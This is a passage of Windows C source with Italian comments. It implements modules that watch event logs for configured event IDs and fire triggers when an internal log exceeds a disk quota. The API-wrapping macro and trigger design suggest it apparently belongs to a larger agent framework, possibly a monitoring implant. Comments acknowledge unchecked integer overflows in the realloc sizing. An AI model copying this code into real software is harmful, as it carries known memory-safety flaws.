				for (k=0; k<em_me_source_table[i].event_count; k++) 
					// Compara l'evento j-esimo nella sorgente con il k-esimo 
					// elemento da monitorare per quella sorgente
					if (pevlr->EventID == em_me_source_table[i].event_array[k].event_monitored) {
						TriggerEvent(em_me_source_table[i].event_array[k].event_triggered);
						break;
					}
			}

			// Aggiorna il numero di eventi per la sorgente
			em_me_source_table[i].last_record_num = new_record_count;
		}
	
		Sleep(EM_ME_SLEEPTIME);
	}
}


// Aggiunge un evento da monitorare a una sorgente
void MonEventAddEvent(monitored_source *source_entry, DWORD event_monitored, DWORD event_triggered)
{
	void *temp_table;

	// event_array e' inizializzato a 0 in EM_MonEventAdd
	// XXX...altro piccolo ed improbabile int overflow
	if ( !(temp_table = realloc(source_entry->event_array, (source_entry->event_count + 1)*sizeof(monitored_event))) )
		return;
	
	source_entry->event_array = (monitored_event *)temp_table;
	source_entry->event_array[source_entry->event_count].event_monitored = event_monitored;
	source_entry->event_array[source_entry->event_count].event_triggered = event_triggered;

	source_entry->event_count++;
}


void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
{
	typedef struct {
		DWORD event_monitored; // Evento da monitorare
		char source_name[1];   // Nome della sorgente da monitorare (NULL terminated)
	} conf_entry_t;
	conf_entry_t *conf_entry;
	void *temp_table;
	DWORD i;

	// Controlla anche che il puntatore non sia nullo
	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
		return;

	// Se la sorgente e' gia' monitorata aggiunge un evento...
	for (i=0; i<em_me_source_count; i++) 
		if (!strcmp(em_me_source_table[i].source_name, conf_entry->source_name)) {
			MonEventAddEvent(em_me_source_table + i, conf_entry->event_monitored, event);
			return;
		}

	// ...altrimenti aggiunge la sorgente...
	// (XXX...altro piccolo ed improbabile int overflow)
	if ( !(temp_table = realloc(em_me_source_table, (em_me_source_count + 1)*sizeof(monitored_source))) )
		return;

	em_me_source_table = (monitored_source *)temp_table;
	em_me_source_table[em_me_source_count].event_count = 0;
	em_me_source_table[em_me_source_count].event_array = NULL;
	em_me_source_table[em_me_source_count].source_handle = 0;
	em_me_source_table[em_me_source_count].last_record_num = 0;
	em_me_source_table[em_me_source_count].source_name = _strdup(conf_entry->source_name);

	// ...e aggiunge l'evento...
	MonEventAddEvent(em_me_source_table + em_me_source_count, conf_entry->event_monitored, event);

	em_me_source_count++;
}


void WINAPI EM_MonEventStart()
{
	DWORD dummy, i, record_number, oldest_record;

	// Apre tutte le sorgenti da monitorare (verranno chiuse in EM_MonEventStop)
	// e inizializza il numero di eventi gia' presenti al momento dell'apertura
	for (i=0; i<em_me_source_count; i++) {
		em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);
		if (em_me_source_table[i].source_handle &&
			FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &record_number) &&
			FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_record))
			em_me_source_table[i].last_record_num = record_number + oldest_record;
		else {
			// Se non riesce a leggere il numero di eventi chiude la sorgente e non 
			// la considera' piu'.
			em_me_source_table[i].last_record_num = 0;		
			SAFE_CLOSE(em_me_source_table[i].source_handle);
		}
	}

	// Crea il thread solo se ci sono sorgenti da monitorare
	if (em_me_source_count>0)
		em_me_monevent_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorWindowsEvent, NULL, 0, &dummy);
}


void WINAPI EM_MonEventStop()
{
	DWORD i;

	QUERY_CANCELLATION(em_me_monevent_thread, em_me_cp);
	
	// Libera tutte le strutture allocate
	for (i=0; i<em_me_source_count; i++) {
		SAFE_FREE(em_me_source_table[i].source_name);
		SAFE_FREE(em_me_source_table[i].event_array);
		SAFE_CLOSE(em_me_source_table[i].source_handle);
	}
	SAFE_FREE(em_me_source_table);
	em_me_source_count = 0;
}





//----------------------------------------------------
// QUOTA DISCO
typedef struct {
	DWORD disk_quota;
	DWORD event_code;
	DWORD exit_event;
	BOOL cp;        // semaforo per l'uscita dei thread di controllo
	HANDLE thread_id;
} monitored_quota;

DWORD em_qt_quota_count = 0;
monitored_quota *em_qt_quota_table = NULL;

#define QUOTA_DELAY_INTERVAL 100
#define QUOTA_DELAY_SLEEP    60000
DWORD QuotaMonitorThread(monitored_quota *quota)
{
	DWORD i, log_size;
	BOOL quota_passed = FALSE;

	LOOP {
		log_size = LOG_GetActualLogSize();

		if (log_size > quota->disk_quota) {
			TriggerEvent(quota->event_code);
			quota_passed = TRUE;
		} else {
			if (quota_passed) {
				quota_passed = FALSE;
				TriggerEvent(quota->exit_event);
			}
		}

		// -> Sleep(QUOTA_DELAY_SLEEP);
		for (i=0; i<=QUOTA_DELAY_SLEEP / QUOTA_DELAY_INTERVAL; i++) {
			CANCELLATION_POINT(quota->cp);
			Sleep(QUOTA_DELAY_INTERVAL); 
		}

	}

	return 0;
}

#define QUOTA_NEW_TAG 0x20100505
void WINAPI EM_QuotaAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
{
	typedef struct {
		DWORD disk_quota;
		DWORD tag;
		DWORD exit_event;
	} conf_entry_t;
	conf_entry_t *conf_entry;
	void *temp_table;

	// Controlla anche che il puntatore non sia nullo
	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
		return;

	// XXX...altro piccolo ed improbabile int overflow....
	if ( !(temp_table = realloc(em_qt_quota_table, (em_qt_quota_count + 1)*sizeof(monitored_quota))) )
		return;

	em_qt_quota_table = (monitored_quota *)temp_table;
	em_qt_quota_table[em_qt_quota_count].thread_id = 0;
	em_qt_quota_table[em_qt_quota_count].disk_quota = conf_entry->disk_quota;
	em_qt_quota_table[em_qt_quota_count].event_code = event;
	em_qt_quota_table[em_qt_quota_count].cp = FALSE;
	if (conf_entry->tag == QUOTA_NEW_TAG) 
		em_qt_quota_table[em_qt_quota_count].exit_event = conf_entry->exit_event;
	else
		em_qt_quota_table[em_qt_quota_count].exit_event = AF_NONE;

	em_qt_quota_count++;
}


void WINAPI EM_QuotaStart()
{
	DWORD i, dummy;
	// Lancia i thread che controllano le quote
	for (i=0; i<em_qt_quota_count; i++) 
		em_qt_quota_table[i].thread_id = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)QuotaMonitorThread, (LPVOID)&em_qt_quota_table[i], 0, &dummy);
}


void WINAPI EM_QuotaStop()
{
	DWORD i;

	// Uccide i thread di controllo
	for (i=0; i<em_qt_quota_count; i++) 
		QUERY_CANCELLATION(em_qt_quota_table[i].thread_id, em_qt_quota_table[i].cp);

	SAFE_FREE(em_qt_quota_table);
	em_qt_quota_count = 0;
}

//---------------------------------------------------
